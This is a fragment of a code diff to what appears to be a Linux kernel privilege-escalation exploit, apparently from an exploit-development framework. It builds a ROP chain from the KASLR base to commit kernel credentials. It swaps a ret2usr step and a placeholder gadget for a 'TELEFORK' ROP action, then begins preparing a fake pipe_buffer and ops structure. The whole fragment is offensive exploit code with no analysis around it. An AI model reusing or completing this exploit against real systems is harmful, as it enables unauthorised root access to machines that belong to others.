@@ -8,7 +8,8 @@
 #include <util/syscalls.cpp>
 #include <util/error.cpp>
 #include <util/pwn_utils.cpp>
-#include <util/Payload.cpp>
+#include <payloads/Payload.cpp>
+#include <payloads/RopChain.cpp>
 #include <util/HexDump.cpp>
 #include <util/ArgumentParser.cpp>
 #include <rip/RopUtils.cpp>
@@ -89,8 +90,7 @@ int main(int argc, const char** argv) {
     printf("[+] ROP chain:\n");
     RopChain rop(kaslr_base);
     target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    RopUtils::Ret2Usr(target, rop, (void*)win);
-    rop.Add(0xffffffff41414141);
+    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
     HexDump::Print(rop.GetData());
 
     printf("[+] Preparing fake pipe_buffer and ops\n");
